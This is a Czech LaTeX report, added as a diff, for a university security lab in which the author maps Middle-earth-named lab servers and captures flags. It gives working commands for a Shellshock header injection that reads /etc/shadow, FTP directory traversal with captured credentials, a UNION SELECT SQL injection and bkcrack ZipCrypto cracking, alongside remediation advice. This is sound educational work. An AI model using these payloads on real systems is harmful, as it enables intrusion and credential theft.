@@ -1,0 +1,268 @@
+\documentclass{article}
+
+\usepackage[czech]{babel}
+\usepackage[utf8]{inputenc}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{listings}
+
+\usepackage[ačpaper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}
+
+\usepackage{amsmath}
+\usepackage{graphicx}
+\usepackage[colorlinks=true, allcolors=blue]{hyperref}
+
+\title{BIS - projekt}
+\author{Bc. Veronika Jirmusová
+}
+
+\begin{document}
+\maketitle
+
+
+\section{Zmapování středozemě}
+\subsection{Relevantní servery}
+Poznámka k tabulce: v době, kdy jsem použila služby \textit{nmap} pro zjištění relevantních serverů, již nebyly dostupné jejich názvy. Po zjištění adres jsem se tedy dotázala hodných kolegů, zda by mi nemohli tyto názvy poskytnout, aby se mi lépe pracovalo s nápovědou. Názvy jsem tedy nezjistila sama, ale pomohli mi spolužáci, kteří si zde nepřáli být jmenováni.
+\begin{table}[h!]
+\centering
+\resizebox{300}{!}{
+\begin{tabular}{| l | l | l |}
+\hline
+\textbf{Název} & \textbf{IP} & \textbf{Služby} \\ 
+\hline
+Rivendell & 10.89.1.3 (10.89.1.156) & SSH server - port 22 \\ 
+\hline
+Isengard & 10.89.1.4 (10.89.1.157) & HTTP server - port 80 \\ 
+\hline
+Edoras & 10.89.1.5 (10.89.1.158) & FTP server - port 21 \\ 
+\hline
+Mirkwood & 10.89.1.6 (10.89.1.159) & HTTP server - port 80 \\ 
+\hline
+Admin & 10.89.1.2 (10.89.1.155) &  \\ 
+\hline
+\end{tabular}
+}
+\caption{Seznam serverů a jejich služeb}
+\end{table}
+
+\section{Nalezené zranitelnosti}
+\subsection{SSH-server Rivendell}
+\begin{itemize}[leftmargin=2em]
+    \item \textbf{Přístup k serveru}  
+    Server nebyl zranitelný žádnou konkrétní chybou, případně žádná taková zranitelnost nebyla nalezena. Přístup k serveru byl možný pouze prostřednictvím privátního RSA klíče.
+
+    \item \textbf{Šifrovaný soubor \textit{chest.img}}  
+    Na serveru byl nalezen soubor \textit{chest.img}, který byl zašifrován, pravděpodobně pomocí algoritmu \textit{ZipCrypto}. Tento algoritmus je známý svou zranitelností vůči útoku \textit{known-plaintext attack}.
+
+\end{itemize}
+
+\paragraph{Doporučená řešení}
+\begin{itemize}[leftmargin=2em]
+    \item \textbf{Použití bezpečnějšího šifrovacího algoritmu}  
+    Namísto zastaralého a zranitelného algoritmu \textit{ZipCrypto} doporučuji použití modernějšího a bezpečnějšího algoritmu, jako je například \textit{AES-256}, který poskytuje výrazně vyšší úroveň zabezpečení proti známým útokům.
+\end{itemize}
+\subsection{HTTP-server Isengard}
+Objevila jsem na tomto serveru zranitelnost známou jako \textit{Shellshock}. Tato zranitelnost umožňuje spustit libovolný příkaz na serveru prostřednictvím nesprávně validovaných HTTP hlaviček, které jsou předávány shellu \textit{bash}. 
+
+Útočník může tímto způsobem získat vzdálený přístup k příkazové řádce serveru a provádět na něm libovolné operace, včetně čtení, mazání nebo úpravy souborů, případně získání vyšších oprávnění, což představuje kritické ohrožení systému.
+
+\paragraph{Příčina zranitelnosti:}
+Zranitelnost Shellshock je způsobena nedostatečným ošetřením vstupu v shellu \textit{bash} v kombinaci se špatně navrženým kódem webového serveru, který přímo předává obsah hlaviček do shellu.
+
+\paragraph{Doporučení:}
+\begin{itemize}
+    \item \textbf{Aktualizace bash}: Okamžitě aktualizovat \textit{bash} na verzi, která již není zranitelná vůči Shellshock.
+    \item \textbf{Omezení přístupu}: Omezit použití shellových skriptů pro zpracování vstupních dat, a pokud je to nutné, používat bezpečné metody pro předávání dat.
+    \item \textbf{Validace vstupu}: Důsledně validovat všechny vstupy přicházející od uživatelů, a to nejen v HTTP hlavičkách, ale ve všech částech webové aplikace.
+    \item \textbf{Nasazení WAF}: Použít \textit{Web Application Firewall (WAF)}, který může detekovat a blokovat podezřelé požadavky směřující na webový server.
+\end{itemize}
+\subsection{FTP-server Edoras}
+Nalezené zranitelnosti jsem pro přehlednost rozdělila do několika bod\r u. Předpokládám, že \' utočník zná přihlašovací \' udaje.
+\begin{itemize}[leftmargin=2em]
+    \item \textbf{Možnost přístupu k nadřazeným složkám (Directory Traversal)}  
+    Uživatel s přístupem k FTP serveru mohl získat přístup k nadřazeným složkám serveru a tím k citlivým systémovým souborům jako \texttt{/etc/passwd} a \texttt{/etc/shadow} pomocí relativních cest (\texttt{../}).  
+    \textbf{Příklad útoku:}  
+    \texttt{curl ftp://10.89.1.158/\%2e\%2e/\%2e\%2e/etc/passwd --user admin:iloveyou}
+    
+    \item \textbf{Přístup k souborům s uživatelskými daty}  
+    Bylo možné získat obsah souborů \texttt{/etc/passwd} a \texttt{/etc/shadow}, které mohou obsahovat citlivé \' udaje.
+
+    \item \textbf{Slabá konfigurace přístupových práv}  
+    Uživatel „admin“ měl možnost přistupovat mimo svůj domovský adresář \texttt{/home/admin} a mohl číst systémové soubory.
+
+\end{itemize}
+
+\subsection*{Příčiny zranitelností}
+\begin{itemize}[leftmargin=2em]
+    \item \textbf{Chybějící omezení přístupu v konfiguraci FTP serveru}  
+    Server umožňoval přístup mimo domovský adresář uživatele kvůli nesprávné konfiguraci, která vedla k zranitelnosti \textit{Directory Traversal}.
+
+    \item \textbf{Nesprávně nastavená přístupová práva k systémovým souborům}  
+    Systémové soubory jako \texttt{/etc/passwd} a \texttt{/etc/shadow} nebyly dostatečně chráněny před přístupem neprivilegovaných uživatelů FTP.
+\end{itemize}
+
+\subsection*{Doporučená řešení}
+\begin{itemize}
+    \item \textbf{Omezení přístupu pouze na domovský adresář uživatele}  
+    V konfiguraci FTP serveru nastavit tzv. „chroot jail“, který uživatele omezí pouze na jeho domovský adresář.
+    \item \textbf{Zákaz přístupu k citlivým systémovým souborům}  
+    Ujistit se, že soubory \texttt{/etc/passwd} a \texttt{/etc/shadow} mají správně nastavena oprávnění, aby nebyly dostupné uživatelům FTP.
+
+    \item \textbf{Použití šifrovaného přenosu dat}  
+    Doporučuji použít FTPS nebo SFTP místo nezabezpečeného FTP, čímž se zajistí šifrování přenášených dat.
+
+    \item \textbf{Pravidelný audit konfigurace a oprávnění}  
+    Provádět pravidelnou kontrolu konfigurace FTP serveru a přístupových práv, aby se minimalizovala možnost zneužití zranitelností.
+\end{itemize}
+\subsection{HTTP-server Mirkwood}
+Webový server obsahuje formulář pro nahrávání souborů přes \texttt{upload.php}, který však nedostatečně validuje vstupní data. Bylo možné obejít kontrolu typu souboru, což umožňuje nahrání potenciálně nebezpečného souboru.
+
+Kromě toho jsem na tento server zkoušela útok typu \textit{SQL injection}, což naznačuje, že není dostatečně chráněn proti manipulaci s databázovými dotazy.
+
+\paragraph{Doporučení:}
+\begin{itemize}
+    \item Důsledná kontrola typů nahrávaných souborů na straně serveru, nejen na základě přípony, ale také pomocí funkcí pro kontrolu MIME typu.
+    \item Implementace \textit{Content Security Policy} (CSP), která znemožní spuštění škodlivého kódu.
+    \item Zavedení přísných oprávnění pro přístup k nahraným souborům a oddělení veřejných a systémových adresářů.
+    \item Ochrana proti SQL injection prostřednictvím použití připravených dotazů (\textit{prepared statements}) a ORM (Object-Relational Mapping).
+\end{itemize}
+\section{Postup}
+\subsection*{Tajemství A}
+
+\paragraph{Postup pro získání tajemství A:}
+
+\begin{itemize}
+    \item \textbf{Zahájení testování serveru:} Nejprve jsem provedla běžný požadavek na server, abych zjistila, zda server správně odpovídá:
+    \begin{verbatim}
+    curl http://10.89.1.157
+    \end{verbatim}
+    Server odpověděl, což znamená, že je online a připraven na připojení.
+
+    \item \textbf{Testování zranitelnosti Shellshock:} Následně jsem využila známé zranitelnosti Shellshock k provedení vzdáleného spuštění příkazu na serveru. Poslala jsem HTTP požadavek s podvrženou hlavičkou \texttt{User-Agent}, která obsahovala škodlivý kód. Tento kód spustil příkaz \texttt{ls -la}, což způsobilo výpis souborů v adresáři:
+
+
+    \begin{verbatim}
+    curl -H 'User-Agent: () { :; }; echo vulnerable;
+    bash -c "ls -la"' http://10.89.1.157/cgi-bin/gate
+    \end{verbatim}
+    Server vrátil odpověď, která potvrzuje, že zranitelnost Shellshock je přítomná a server reagoval na požadavek.
+
+    \item \textbf{Získání citlivých informací z /etc/shadow:} V další fázi jsem použila tuto zranitelnost k získání citlivých informací z konfiguračního souboru \texttt{/etc/shadow}, který obsahuje hesla uživatelů v zašifrované podobě. Použila jsem podobný požadavek jako v předchozím kroku, ale s příkazem pro výpis souboru \texttt{/etc/shadow}:
+    \begin{verbatim}
+    curl -H 'User-Agent: () { :; }; echo ; 
+    /bin/bash -c "cat /etc/shadow"' http://10.89.1.157/cgi-bin/gate
+    \end{verbatim}
+    Tento příkaz mi umožnil získat obsah souboru \texttt{/etc/shadow}, který obsahoval tajemství A:
+    \begin{center}
+    \texttt{Tajemstvi\_A\_3c3c26b0d80d2e0ae7bc94f850a89220dc99c710cdfac031c01063bdd698a159}
+    \end{center}
+\end{itemize}
+
+\paragraph{Závěr:}
+Zranitelnost Shellshock byla klíčová pro získání tajemství A. Pro efektivní zabezpečení tohoto serveru je nutné provést aktualizaci a opravy týkající se této zranitelnosti, což by zabránilo spouštění škodlivých příkazů prostřednictvím HTTP hlaviček.
+
+\section{Tajemství B}
+Při hledání tajemství D jsem objevila přihlašovací \' udaje, které šly využít pro získání tohoto tajemství, tedy:
+\begin{verbatim}
+<html>
+  <body>
+    <h2>Woodelf Items</h2>
+    <ul>
+      <li>{"0":1,"id":1,"1":"admin","name":"admin","2":"iloveyou","category":"iloveyou"}</li>
+    </ul>
+  </body>
+</html>
+\end{verbatim}
+
+\begin{itemize}
+  \item \textbf{Zahájení testování FTP serveru:} 
+  Nejprve jsem provedla FTP požadavek na server a pokusila se přistupovat do složky \texttt{/etc/shadow}. Pro tento účel jsem použila následující příkaz:
+  \begin{lstlisting}[language=bash]
+    curl ftp://10.89.1.158/%2e%2e/%2e%2e/etc/shadow --user admin:iloveyou
+  \end{lstlisting}
+  Tento příkaz se pokusil stáhnout obsah souboru \texttt{shadow} z FTP serveru, což je soubor obsahující uživatelské účty a šifrovaná hesla.
+
+  \item \textbf{Další testování s jiným uživatelem:}
+  Po ne tolik úspěšném získání přístupu s uživatelem \texttt{admin}, jsem si všimla stejného hashe u hesla pro uživatele \texttt{theoden}. Proto jsem se tedy zkusila k serveru připojit následovně:
+  \begin{lstlisting}[language=bash]
+    curl ftp://10.89.1.158/%2e%2e/%2e%2e/etc/shadow --user theoden:iloveyou
+  \end{lstlisting}
+
+  \item \textbf{Zjištění přístupu k souboru \texttt{secret.txt}:}
+  Po ověření přístupu k souboru \texttt{/etc/shadow} jsem provedla další krok a zjistila, že na FTP serveru je soubor \texttt{secret.txt}. Tento soubor jsem stáhla pomocí příkazu:
+  \begin{lstlisting}[language=bash]
+    curl ftp://10.89.1.158/secret.txt --user theoden:iloveyou
+  \end{lstlisting}
+  Soubor \texttt{secret.txt} obsahoval tajemství B:
+  \begin{center}
+    \texttt{Tajemstvi\_B\_3e898b1cea2213494669cbfcbe0a1d880535e0da356324887b3f9ca7e32d88d6}
+  \end{center}
+\end{itemize}
+
+\section{Tajemství D}
+\begin{itemize}
+    \item \textbf{Úvod:} 
+    Na serveru Mirkwood jsem provedla testování SQL injekce, abych získala citlivé informace z databáze. Cílem bylo získat přihlašovací údaje a identifikovat potenciální tajemství.
+
+    \item \textbf{Testování SQL injekce:} 
+    Použila jsem techniku SQL injekce k získání informací z databáze. Provedla jsem následující požadavek, který využívá SQL příkaz \texttt{UNION SELECT} pro sloučení výsledků dotazu na tabulku \texttt{users}. Tento dotaz umožnil získat uživatelská jména a hesla:
+    \begin{verbatim}[language=bash]
+    curl -v "http://10.89.1.159/list.php?id=-1%20UNION%20SELECT%201,username,
+    password%20FROM%20users--"
+    \end{verbatim}
+    Tento požadavek využil zranitelnosti v aplikaci a umožnil přístup k citlivým údajům.
+
+    \item \textbf{Výstup SQL injekce:}
+    Po provedení injekce jsem obdržela odpověď serveru, která obsahovala následující údaje:
+    \begin{quote}
+    \begin{verbatim}
+    <h2>Woodelf Items</h2><ul><li>{"0":1,"id":1,"1":"admin","name":
+    "admin","2":"iloveyou","category":"iloveyou"}</li><li>{"0":1,"id":1,"1":"legolas"
+    ,"name":
+    "legolas","2":"expired","category":"expired"}</li><li>{"0":1,"id":1,"1":"thranduil"
+    ,"name":
+"thranduil","2":
+"Tajemstvi_D_4182e9da3f669a396294d93df966c12a7a97e04e3b5147dd0ab654ce53e90395",
+"category":"Tajemstvi_D_4182e9da3f669a396294d93df966c12a7a97e04e3b5147dd0ab654ce53e90395"}
+</li></ul>
+    \end{verbatim}
+    \end{quote}
+    Tento výstup obsahoval tajemství \texttt{Tajemstvi\_D} a přihlašovací \' udaje k tajemství B, které jsem dále využila (popsáno výše).
+
+\end{itemize}
+
+\section{Tajemství E}
+\begin{itemize}
+    \item \textbf{Stažení souboru:} 
+    Nejprve jsem stáhla soubor \texttt{chest.img} ze serveru Rivendell, pomocí následujícího příkazu \texttt{wget}:
+    \begin{lstlisting}[language=bash]
+    wget 10.89.1.156/shrine/chest.img
+    \end{lstlisting}
+
+    \item \textbf{Použití nástroje \texttt{bkcrack}:} 
+    Poté jsem použila nástroj \texttt{bkcrack} k dešifrování zašifrovaného souboru \texttt{extracted.zip}, konkrétně souboru \texttt{scroll.xml}, pomocí známého textu (soubor \texttt{known.txt}):
+    \begin{lstlisting}[language=bash]
+    bkcrack -C "extracted.zip" -c "scroll.xml" -p "known.txt"
+    \end{lstlisting}
+    Kde jsem do souboru \texttt{known.txt} napsala následující:
+    \begin{lstlisting}
+        <?xml version=",
+    \end{lstlisting}
+    protože je soubor \texttt{scroll.xml} s příponou \textit{.xml.}
+    Po provedení útoku, \texttt{bkcrack} našel klíče pro dešifrování souboru.
+
+    \item \textbf{Výsledek útoku:} 
+    Nástroj \texttt{bkcrack} úspěšně provedl dešifrování a nalezl následující klíče:
+    \begin{quote}
+    \texttt{685ca420 fd16a6fa 6f2164cb}
+    \end{quote}
+
+    \item \textbf{Dešifrování souboru:} 
+    S těmito klíči jsem následně dešifrovala soubor \texttt{scroll.xml}, což vedlo k odhalení tajemství E:
+    \begin{center}
+    \texttt{Tajemstvi\_E\_5fd2090b1d9ca5b47a19978127fc5d38305cae2ad1c83dd382f7c5243cfe4d4d}
+    \end{center}
+\end{itemize}
+
+
+\end{document}
